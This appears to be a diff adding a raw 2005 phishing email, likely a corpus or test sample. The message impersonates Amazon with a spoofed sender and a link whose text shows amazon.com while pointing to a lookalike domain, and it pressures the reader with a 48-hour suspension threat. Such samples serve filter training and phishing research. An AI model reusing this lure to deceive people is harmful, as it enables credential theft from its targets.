@@ -1,0 +1,67 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 406832A88C
+ for <user@example.com>; Sun, 25 Sep 2005 20:33:44 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 31444621C89; Sun, 25 Sep 2005 20:33:44 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 0C7B1621C71
+ for <user@example.com>; Sun, 25 Sep 2005 20:33:44 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id UAA27682
+ for user@example.com; Sun, 25 Sep 2005 20:33:43 -0400
+Received: from P02.NEXLINK.NET (p02.nexlink.net [80.86.195.50])
+ by mail.example.com with ESMTP id UAA27674
+ for <user@example.com>; Sun, 25 Sep 2005 20:33:42 -0400
+Received: (qmail 16907 invoked by uid 48); 25 Sep 2005 20:09:00 -0000
+Date: 25 Sep 2005 20:09:00 -0000
+Message-ID: <20050925200900.16905.qmail@P02.NEXLINK.NET>
+To: user@example.com
+Subject: Revision to Your Amazon.com Information
+From: Amazon <service@amazon.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Content-Length: 1887
+Lines: 34
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 163
+
+
+<HTML>
+<BODY>
+
+<br><br><table style="width:900px" cellpadding="0" cellspacing="0" border="0" align="center">
+	<tr>
+<img SRC="http://g-images.amazon.com/images/G/01/nav/amazon/amzn-logo-118w.gif"  BORDER=0 height=23 width=100>
+	</tr>
+
+<P><BR><BR>
+<P class=style6>
+<P class=style4 align=left><SPAN class=style7>At the last reviewing at your amazon account we discovered that your information is inaccurate. We apologize for this but because most frauds are possible because we don't have enough information about our clients, we require this verification. Please login and reenter  your personal information</SPAN>. 
+<P class=style2 align=center>
+<P class=style7 align=left>Please follow this link to update your personal information: 
+<P class=style2 align=left><BR>
+<P>
+<P class=style2 align=left><A class=style3 href="http://www.amazon.com.ssl-session.info?css/account/info/view.html/ref=ya_hp_pi_1/104-1656891-4285513" target="_blank" > http://www.amazon.com/exec/obidos/sign-in.html</A> 
+<P class=style5 align=left>(To complete the verification process you must fill in all the required fields) 
+<P>
+<P>
+<P>
+<P><SPAN class=style3>Please note: </SPAN><SPAN class=style7>If you don't update your information within next 48 hours , we will be forced to suspend your account untill you have the time to contact us by phone</SPAN>. 
+<P>
+<P>We apreciate your support and understanding, as we work together to keep amazon market a safe place to trade. Thank you for your attention on this serious matter and we apologize. <BR>
+<P>
+<TABLE cellSpacing=0 cellPadding=0>
+</TD></TR></TBODY></TABLE>
+<HR align=left SIZE=1>
+<SPAN class=style10>This message was generated automatically, please do not reply to it. Amazon treats your personal information with the utmost care, and our Privacy Policy is designed to protect you and your information.</SPAN> 
+<HR noShade SIZE=1>
+</TD></TR></TABLE>
+
+
+
